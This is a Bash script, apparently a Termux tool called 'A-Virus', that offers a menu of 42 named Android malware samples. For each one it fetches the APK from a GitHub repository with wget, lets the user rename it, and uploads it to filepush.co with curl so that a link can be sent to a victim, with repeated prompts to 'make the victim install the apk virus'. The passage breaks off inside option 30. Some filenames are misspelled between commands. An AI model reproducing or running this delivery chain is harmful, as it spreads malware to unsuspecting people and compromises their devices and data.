#Author:AnonymousX11-debug
#Credits to: AnonyminHack5 
#!bin/bash
cls || clear
banner() {
printf "\e[1;32m\t____    _  _ _ ____ _  _ ____  \e[0m\n"
printf "\e[1;32m\t|__| __ |  | | |__/ |  | [__   \e[0m\n"
printf "\e[1;32m\t|  |     \/  | |  \ |__| ___]  \e[0m\n"
printf "\n"                                
printf "\e[1;32m \tAuthor: \e[0m\e[1;32mAnonymousX11-Debug😎 \e[0m\n"
printf "\e[1;20m \tTeam: TermuxHackz Society&PLAUnit61398:CyberTerminators \e[0m\n"
printf "\e[1;92m\t[\e[0m\e[1;93m•\e[0m\e[;92m]\e[0m\e[1;94m Credits:\e[0m\e[1;97m AnonyminHack5😎 \e[0m\e[1;92m[\e[0m\e[1;93m•\e[0m\e[;92m]\e[0m\n"
printf "\n"
printf "\e[101mThis Tool Should only be used For Educational Purposes. \e[0m\n"
printf "\n"
printf "\e[1;37m\tThis tool generates Virus apk and turns it into link for you to send and infect your victim\e[0m\n"
printf "\n"
printf "\e[101m\tKindly use this tool with caution\e[0m\n"
}
# APK 
apk() {
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus into his/her device\e[0m\e[34m"
   curl --upload-file $newName.apk https://filepush.co/upload/$newName.apk
   rm -f $newName.apk
}
author() {
clear
printf "\n"
sleep 0.5
printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Credits to: \e[0m\e[1;37mAnonyminHack5 \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;97m[•]\e[0m\e[1;91m Author: \e[0m\e[1;37mAnonymousX11-Debug\e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mTermuxHackz Society \e[0m\e[1;97m[•]\e[0m\n"
sleep 0.5
printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mA-Virus\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
sleep 0.5
printf "\n"
sleep 0.5
echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
read a1
clear
banner
menu
} 

banner
menu() {
	printf "\n"
printf "\e[0;34m\tWelcome To A-Virus..\e[0m\n"
printf "\n"
printf "\t[1]\e[1;44m=>\e[0m\e[1;93mA-Virus Apk\e[0m\n"
printf "\t[2]\e[1;44m=>\e[0m\e[1;93mAuthor\e[0m\n"
printf "\t[3]\e[1;44m=>\e[0m\e[1;93mExit A-Virus\e[0m\n"
printf "\t[4]\e[1;44m=>\e[0m\e[1;93mUpdate A-Virus tool\e[0m\n"
printf "\n"
read -p "Please Choose Your Option: " choose

if [[ $choose == 1 ]]; then
   echo -e "\e[32mLIST OF A-VIRUS APK\e[0m"
   echo -e "\e[36m 1. Agent"
   echo -e " 2. BadNews.A"
   echo -e " 3. Bios.NativeMaliciousCode"
   echo -e " 4. Blatantsms"
   echo -e " 5. BrainTest"
   echo -e " 6. Claco.A"
   echo -e " 7. Dropdialer"
   echo -e " 8. FakeBank.B"
   echo -e " 9. FakeCMCC.A"
   echo -e " 10. FakeDoc"
   echo -e " 11. FakeValidation"
   echo -e " 12. Fobus"
   echo -e " 13. GinMaster.Z.AdvancedObfuscation"
   echo -e " 14. Masnu"
   echo -e " 15. Omigo"
   echo -e " 16. Opfake"
   echo -e " 17. SmsWorker"
   echo -e " 18. Vietcon"
   echo -e " 19. candy_corn"
   echo -e " 20. cat"
   echo -e " 21. chistescortos"
   echo -e " 22. chistespicanticos"
   echo -e " 23. com.funnyys"
   echo -e " 24. com.imagepets"
   echo -e " 25. com.kitchenn"
   echo -e " 26. com.laughtter"
   echo -e " 27. com.prasesamor"
   echo -e " 28. com.prasesfee"
   echo -e " 29. com.recipesmart"
   echo -e " 30. com.romaticpos"
   echo -e " 31. com.statetss"
   echo -e " 32. com.thinkkign"
   echo -e " 33. crd"
   echo -e " 34. dendroid"
   echo -e " 35. ds"
   echo -e " 36. fake_av"
   echo -e " 37. Grave"
   echo -e " 38. Malum"
   echo -e " 39. Mobile_Legends_Adventure"
   echo -e " 40. TakeBeer"
   echo -e " 41. elite"
   echo -e " 42. mobelejen"
   echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mChoose Virus APK you want:  \e[0m\e[34m"
   read apkVirus
   echo -e "\e[0m"
   if [ $apkVirus = 1 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Agent.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Agent.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Agent.apk https://filepush.co/upload/Agent.apk
         rm -f Agent.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi

   elif [ $apkVirus = 2 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/BadNews.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv BadNews.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file BadNews.A.apk https://filepush.co/upload/BadNews.A.apk
         rm -f BadNews.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m" 
      fi
   elif [ $apkVirus = 3 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Bios.NativeMaliciousCode.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Bios.NativeMaliciousCode.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Bios.NativeMaliciousCode.apk https://filepush.co/upload/Bios.NativeMaliciousCode.apk
         rm -f Bios.NativeMaliciousCode.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 4 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Blatantsms.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Blatantsms.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Blantantsms.apk https://filepush.co/upload/Blatantsms.apk
         rm -f Blatantsms.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 5 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/BrainTest.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv BrainTest.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file BrainTest.apk https://filepush.co/upload/BrainTest.apk
         rm -f BrainTest.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 6 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Claco.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Claco.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Claco.A.apk https://filepush.co/upload/Claco.A.apk
         rm -f Claco.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 7 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Dropdialer.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Dropdialer.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Dropdialer.apk https://filepush.co/upload/Dropdialer.apk
         rm -f Dropdialer.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 8 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeBank.B.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeBank.B.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeBank.B.apk https://filepush.co/upload/FakeBank.B.apk
         rm -f FakeBank.B.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 9 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeCMCC.A.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeCMCC.A.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeCMCC.A.apk https://filepush.co/upload/FakeCMCC.A.apk
         rm -f FakeCMCC.A.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 10 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeDoc.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeDoc.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeDoc.apk https://filepush.co/upload/FakeDoc.apk
         rm -f FakeDoc.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 11 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/FakeValidation.apk
       echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv FakeValidation.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file FakeValidation.apk https://filepush.co/upload/FakeValidation.apk
         rm -f FakeValidation.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 12 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Fobus.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Fobus.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Fobus.apk https://filepush.co/upload/Fobus.apk
         rm -f Fobus.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 13 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/GinMaster.Z.AdvancedObfuscation.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv GinMaster.Z.AdvancedObfuscation.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file GinMaster.Z.AdvancedObfuscation.apk https://filepush.co/upload/GinMaster.Z.AdvancedObfuscation.apk
         rm -f GinMaster.Z.AdvancedObfuscation.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 14 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Masnu.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Masnu.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Masnu.apk https://filepush.co/upload/Masnu.apk
         rm -f Masnu.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi

   elif [ $apkVirus = 15 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Omigo.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Omigo.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Omigo.apk https://filepush.co/upload/Omigo.apk
         rm -f Omigo.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 16 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Opfake.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Opfake.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Opfake.apk https://filepush.co/upload/Opfake.apk
         rm -f Opfake.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 17 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/SmsWorker.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv SmsWorker.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file SmsWorker.apk https://filepush.co/upload/SmsWorker.apk
         rm -f SmsWorker.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 18 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/Vietcon.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv Vietcon.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file Vietcon.apk https://filepush.co/upload/Vietcon.apk
         rm -f Vietcon.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 19 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/candy_corn.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv candy_corn.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file candy_corn.apk https://filepush.co/upload/candy_corn.apk
         rm -f candy_corn.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 20 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/cat.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv cat.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file cat.apk https://filepush.co/upload/cat.apk
         rm -f cat.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 21 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/chistescortos.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv chistrscortos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file chistescortos.apk https://filepush.co/upload/chistescortos.apk
         rm -f chistescortos.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 22 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/chistespicanticos.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv chistespicanticos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file chistespicanticos.apk https://filepush.co/upload/chistespicanticos.apk
         rm -f chistespicanticos.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 23 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.funnyys.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.funnyys.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.funnyys.apk https://filepush.co/upload/com.funnyys.apk
         rm -f com.funnyys.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 24 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.imagepets.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.imagepets.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.imagepets.apk https://filepush.co/upload/com.imagepets.apk
         rm -f com.imagepets.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 25 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.kitchenn.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.kitchenn.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.kitchenn.apk https://filepush.co/upload/com.kitchenn.apk
         rm -f com.kitchenn.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 26 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.laughtter.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.laughtter.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.laughtter.apk https://filepush.co/upload/comlaughtter.apk
         rm -f com.laughtter.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 27 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesamor.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.prasesamor.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.prasesamor.apk https://filepush.co/upload/com.prasesamor.apk
         rm -f com.prasesamor.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 28 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.prasesfee.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.prasesfee.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.prasesfee.apk https://filepush.co/upload/com.prasesfee.apk
         rm -f com.prasesfee.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 29 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.recipesmart.apk
      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.recipesmart.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
         curl --upload-file com.recipesmart.apk https://filepush.co/upload/com.recipesmart.apk
         rm -f com.recipesmart.apk
      else
         echo -e "\e[91mWrong input. Try again.\e[0m"
      fi
   elif [ $apkVirus = 30 ]; then
      wget https://github.com/LOoLzeC/vcrt/raw/master/com.romaticpos.apk
     echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
      read change
      if [ "$change" = "y" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
         read newName
         mv com.romanticpos.apk $newName.apk
         apk
      elif [ "$change" = "n" ]; then
         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
